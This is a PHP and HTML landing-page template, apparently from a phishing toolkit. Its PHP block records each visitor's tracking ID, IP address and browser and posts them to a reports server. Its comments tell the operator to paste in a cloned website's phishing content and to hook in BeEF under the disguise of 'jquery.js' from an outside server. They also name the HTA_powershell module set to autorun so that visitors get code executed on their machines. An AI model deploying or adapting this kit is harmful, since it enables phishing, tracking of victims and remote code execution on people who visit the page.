<!-- created by antisnatchor, 1th July 2014-->
<?php
   $uid = $_GET['uid'];
   $ip = $_SERVER["REMOTE_ADDR"];
   $browser = $_SERVER['HTTP_USER_AGENT'];
   $host = $_SERVER['HTTP_HOST'];

  $url = "http://" . explode(".",$host,2)[1] . '/reports/results/';
  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip);

  // use key 'http' even if you send the request to https://...
  $options = array(
          'http' => array(
          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
          'method'  => 'POST',
          'content' => http_build_query($data),
          ),
  );
  $context  = stream_context_create($options);
  $result = file_get_contents($url, false, $context);
?>

<!DOCTYPE html>
<!--
-- NOTE: replace this HTML index stub with the phishing content of a website of choice.
-- NOTE: Remember to also add the BeEF hook (I've changed it to jquery.js, you can configure that), and use
--       the HTA_powershell BeEF module with "autorun: true" and "xhr_poll_timeout: 1000" for best results.
-->
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
 <script type="text/javascript" src="http://your_BeEF_server.com/jquery.js"></script>
 </head>
 <body>
    <b>If you allow HTA execution, I will give you some BeEF!</b>
 </body>
</html>
